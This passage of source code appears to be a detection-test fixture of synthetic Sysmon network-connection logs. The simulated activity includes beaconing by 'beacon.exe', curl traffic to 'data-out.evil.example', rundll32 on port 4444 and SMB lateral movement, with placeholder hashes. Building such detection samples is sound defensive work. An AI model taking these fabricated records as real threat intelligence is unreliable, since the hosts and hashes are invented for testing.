         '{"SourceIp":"10.1.1.20","SourcePort":"60300","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"2200","User":"CORP\\bob","Hashes":"SHA256=abc017"}', ''),
        (TIMESTAMP '2024-06-15 15:10:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"60301","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"2200","User":"CORP\\bob","Hashes":"SHA256=abc017"}', '')
        ,
        -- Additional repeated traffic and suspicious coverage for richer samples
        (TIMESTAMP '2024-06-15 15:11:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-005',
         '{"SourceIp":"10.1.1.50","SourcePort":"61000","DestinationIp":"198.51.100.24","DestinationPort":"8888","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"5101","User":"CORP\\charlie","Hashes":"SHA256=abc028"}', ''),
        (TIMESTAMP '2024-06-15 15:11:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-005',
         '{"SourceIp":"10.1.1.50","SourcePort":"61001","DestinationIp":"198.51.100.24","DestinationPort":"9999","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"5101","User":"CORP\\charlie","Hashes":"SHA256=abc028"}', ''),
        (TIMESTAMP '2024-06-15 15:12:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-006',
         '{"SourceIp":"10.1.1.60","SourcePort":"62000","DestinationIp":"10.1.1.40","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"WS-004","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"6100","User":"CORP\\dana","Hashes":"SHA256=abc029"}', ''),
        (TIMESTAMP '2024-06-15 15:12:20', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-006',
         '{"SourceIp":"10.1.1.60","SourcePort":"62001","DestinationIp":"10.1.1.30","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"WS-003","Image":"C:\\Windows\\System32\\wmic.exe","ProcessId":"6101","User":"CORP\\dana","Hashes":"SHA256=abc030"}', ''),
        (TIMESTAMP '2024-06-15 15:13:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"52150","DestinationIp":"8.8.4.4","DestinationPort":"53","Protocol":"udp","DestinationHostname":"dns.google","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"1702","User":"CORP\\alice","Hashes":"SHA256=abc037"}', ''),
        (TIMESTAMP '2024-06-15 15:13:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"52151","DestinationIp":"208.67.222.222","DestinationPort":"53","Protocol":"udp","DestinationHostname":"resolver1.opendns.com","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"1703","User":"CORP\\alice","Hashes":"SHA256=abc038"}', ''),
        (TIMESTAMP '2024-06-15 15:14:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-004',
         '{"SourceIp":"10.1.1.40","SourcePort":"53010","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"4103","User":"CORP\\admin","Hashes":"SHA256=abc039"}', ''),
        (TIMESTAMP '2024-06-15 15:14:20', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-004',
         '{"SourceIp":"10.1.1.40","SourcePort":"53011","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"4103","User":"CORP\\admin","Hashes":"SHA256=abc039"}', ''),
        (TIMESTAMP '2024-06-15 15:15:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-005',
         '{"SourceIp":"10.1.1.50","SourcePort":"61100","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"5102","User":"CORP\\charlie","Hashes":"SHA256=abc041"}', ''),
        (TIMESTAMP '2024-06-15 15:16:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-005',
         '{"SourceIp":"10.1.1.50","SourcePort":"61101","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"5102","User":"CORP\\charlie","Hashes":"SHA256=abc041"}', ''),
        (TIMESTAMP '2024-06-15 15:17:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'DC-001',
         '{"SourceIp":"10.1.1.40","SourcePort":"63000","DestinationIp":"192.168.99.1","DestinationPort":"4444","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\rundll32.exe","ProcessId":"3101","User":"CORP\\admin","Hashes":"SHA256=abc035"}', ''),
        (TIMESTAMP '2024-06-15 15:18:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-003',
         '{"SourceIp":"10.1.1.30","SourcePort":"51060","DestinationIp":"203.0.113.200","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"api.dropbox.com","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessId":"8001","User":"CORP\\admin","Hashes":"SHA256=chrome_hash"}', ''),
        (TIMESTAMP '2024-06-15 15:19:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-006',
         '{"SourceIp":"10.1.1.60","SourcePort":"62050","DestinationIp":"10.1.1.5","DestinationPort":"8080","Protocol":"tcp","DestinationHostname":"intranet.corp.local","Image":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE","ProcessId":"6102","User":"CORP\\dana","Hashes":"SHA256=office_hash"}', '')
        """;
}
